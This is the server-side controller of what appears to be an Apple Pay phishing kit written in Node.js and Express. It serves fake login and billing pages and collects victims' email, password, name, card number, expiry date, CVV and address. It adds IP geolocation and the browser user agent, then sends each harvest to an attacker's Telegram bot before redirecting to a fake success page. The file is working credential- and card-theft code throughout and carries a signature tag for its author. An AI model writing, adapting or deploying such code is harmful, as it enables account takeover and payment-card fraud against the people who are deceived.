const { sendMessageFor } = require("simple-telegram-message");
const { botToken, chatId } = require("../settings");
const getIPDetails = require("../middleware/getIPDetails");

let storedCredentials = {
  email: "",
  password: "",
  fname: "",
  cardNum: "",
  exp: "",
  cvv: "",
  address: "",
};

exports.login = (req, res) => {
  res.render('login');
};


exports.loginPost = async (req, res) => {
  const { email, password } = req.body;
  const iPDetails = await getIPDetails();
  const { query, city, region, country, isp } = iPDetails;
  storedCredentials = { email, password };

  const userAgent = req.headers["user-agent"];

  const message =
    `++++++APPLE PAY || LOGIN🔰++++++ + '\n'` +
    `Email : ${email}\n` +
    `Password : ${password}\n` +
    `++++++++++++++++++++++++++++++\n\n` +
    `IP ADDRESS INFO\n` +
    `IP Address       : ${query}\n` +
    `City             : ${city}\n` +
    `State            : ${region}\n` +
    `Country          : ${country}\n` +
    `ISP              : ${isp}\n\n` +
    `+++++++++++++++++++++++++++++++\n\n` +
    `SYSTEM INFO || USER AGENT\n` +
    `USER AGENT       : ${userAgent}\n` +
    `👨‍💻 @akfour7 - TG 👨‍💻`;

  const sendMessage = sendMessageFor(botToken, chatId);
  sendMessage(message);

  res.redirect("/auth/billing-information");
};

exports.card = (req, res) => {
  res.render("card-information");
};

exports.cardPost = async (req, res) => {
  const { fname, cardNum, exp, cvv, address } = req.body;
  const { email, password } = storedCredentials;

  const iPDetails = await getIPDetails();
  const { query, city, region, country, isp } = iPDetails;

  const userAgent = req.headers["user-agent"];
  storedCredentials = { ...storedCredentials, email, password };

  const message =
    `"++++++APPLE PAY🔰++++++" + '\n'` +
    `Username : ${email}\n` +
    `Password : ${password}\n` +
    `++++++++++++++++++++++++++++++++\n\n` +
    `++++++APPLE PAY || CARD DETAILS🔰++++++ + '\n'` +
    `Name on Card : ${fname}\n` +
    `Card Number : ${cardNum}\n` +
    `Expiry Date : ${exp}\n` +
    `CVV : ${cvv}\n` +
    `Address : ${address}\n` +
    `++++++++++++++++++++++++++++++++\n\n` +
    `IP ADDRESS INFO\n` +
    `IP Address       : ${query}\n` +
    `City             : ${city}\n` +
    `State            : ${region}\n` +
    `Country          : ${country}\n` +
    `ISP              : ${isp}\n\n` +
    `++++++++++++++++++++++++++++++++\n\n` +
    `SYSTEM INFO || USER AGENT\n` +
    `USER AGENT       : ${userAgent}\n` +
    `👨‍💻 @akfour7 - TG 👨‍💻`;

  const sendMessage = sendMessageFor(botToken, chatId);
  sendMessage(message);

  res.redirect("/auth/success");
};

exports.success = (req, res) => {
  return res.render("success");
};

exports.page404Redirect = (req, res) => {
  return res.redirect("/auth/login");
};
